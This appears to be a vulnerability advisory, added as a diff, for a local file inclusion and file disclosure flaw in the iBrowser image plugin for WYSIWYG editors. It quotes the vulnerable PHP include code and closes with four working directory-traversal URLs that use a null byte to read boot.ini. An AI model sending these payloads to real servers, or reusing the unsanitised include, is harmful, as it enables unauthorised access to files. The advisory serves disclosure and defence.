@@ -1,0 +1,60 @@
+iBrowser Plugin v1.4.1 (lang) Local File Inclusion Vulnerability
+
+
+Vendor: net4visions.com
+Product web page: http://www.net4visions.com
+Affected version: <= 1.4.1 Build 10182009
+
+Summary: iBrowser is an image browser plugin for WYSIWYG editors like
+tinyMCE, SPAW, htmlAREA, Xinha and FCKeditor developed by net4visions.
+It allows image browsing, resizing on upload, directory management and
+more with the integration of the phpThumb image library.
+
+Desc: iBrowser suffers from a file inlcusion vulnerability (LFI) / file
+disclosure vulnerability (FD) when input passed thru the 'lang' parameter
+to ibrowser.php, loadmsg.php, rfiles.php and symbols.php is not properly
+verified before being used to include files. This can be exploited to
+include files from local resources with directory traversal attacks and
+URL encoded NULL bytes.
+
+
+======================================================================
+/langs/lang.class.php:
+----------------------------------------------------------------------
+
+67: function loadData() {
+68:    global $cfg;
+69:    include( dirname(__FILE__) . '/' . $this -> lang.'.php' );
+70:    $this -> charset = $lang_charset;
+71:    $this -> dir = $lang_direction;
+72:    $this -> lang_data = $lang_data;
+73:    unset( $lang_data );
+74:    include( dirname(__FILE__) . '/' . $cfg['lang'].'.php' );
+75:    $this -> default_lang_data = $lang_data;
+76: }
+
+======================================================================
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+
+
+Advisory ID: ZSL-2011-5041
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5041.php
+
+
+15.09.2011
+
+--
+
+http://[SOME_CMS]/jscripts/tiny_mce/plugins/ibrowser/ibrowser.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
+http://[SOME_CMS]/jscripts/tiny_mce/plugins/ibrowser/scripts/loadmsg.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
+http://[SOME_CMS]/jscripts/tiny_mce/plugins/ibrowser/scripts/rfiles.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
+http://[SOME_CMS]/jscripts/tiny_mce/plugins/ibrowser/scripts/symbols.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00
